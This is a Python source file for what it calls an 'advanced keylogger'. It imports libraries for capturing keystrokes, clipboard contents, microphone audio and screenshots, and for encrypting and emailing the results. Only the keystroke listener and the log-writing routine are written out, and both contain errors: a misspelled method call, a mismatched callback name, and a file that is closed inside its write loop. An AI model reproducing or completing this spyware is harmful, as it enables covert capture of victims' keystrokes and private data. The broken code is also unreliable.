# Libraries

# Libraries for collecting computer information.
import socket
import platform

# Library for system info & time.
import time
import os

# Library for registring keystrokes.
from pynput.keyboard import Key, Listener

# Library for clipboard.
import win32clipboard

# Library for mic capabilities.
from scipy.io.wavfile import write
import sounddevice as sd

# Library for Encryption.
from cryptography.fernet import Fernet

import getpass
from requests import get

# Library for importing screenshots.
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Library for email related functions.
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Log file 

keys_info = "key_log.txt"

file_path = "C:\\Users\\asapa\\Desktop\\ADVANCED KEYLOGGER\\project"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys, count
    
    print(key)
    keys.appen(key)
    count += 1
    
def  write_file(keys):
    with open(file_path + extend + keys_info, "a") as k:
        for key in keys:
            c = str(key).replace("'", " ")
            if c.find ("space") > 0:
                k.write('\n')
                k.close()
                
def on_relese(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()